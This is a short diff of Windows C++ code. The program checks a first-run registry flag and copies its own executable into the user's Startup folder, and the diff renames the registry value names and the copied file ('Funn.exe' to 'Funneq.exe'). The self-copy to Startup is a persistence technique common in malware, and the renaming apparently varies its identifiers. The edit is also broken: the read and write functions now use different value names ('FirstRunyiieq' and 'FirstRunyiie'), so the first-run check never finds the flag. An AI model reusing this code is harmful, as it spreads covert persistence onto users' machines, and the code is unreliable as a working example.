@@ -16,7 +16,7 @@
 bool isFirstRun() {
     HKEY keyHandle;
     const wchar_t* regPath = L"Software\\MyApp";
-    const wchar_t* regValueName = L"FirstRuny";
+    const wchar_t* regValueName = L"FirstRunyiieq";
     DWORD firstRunFlag = 0;
     DWORD dataSize = sizeof(firstRunFlag);
 
@@ -44,7 +44,7 @@ bool isFirstRun() {
 void setFirstRunComplete() {
     HKEY keyHandle;
     const wchar_t* regPath = L"Software\\MyApp";
-    const wchar_t* regValueName = L"FirstRuny";
+    const wchar_t* regValueName = L"FirstRunyiie";
     DWORD firstRunFlag = 0;
 
     if (RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &keyHandle) == ERROR_SUCCESS) {
@@ -143,7 +143,7 @@ bool copyToStartupFolder() {
 
     // Get the path to the user's Startup folder
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
-        std::wstring destinationPath = std::wstring(startupPath) + L"\\Funn.exe";
+        std::wstring destinationPath = std::wstring(startupPath) + L"\\Funneq.exe";
 
         // Copy the file to the Startup folder
         if (CopyFileW(currentPath, destinationPath.c_str(), FALSE)) {
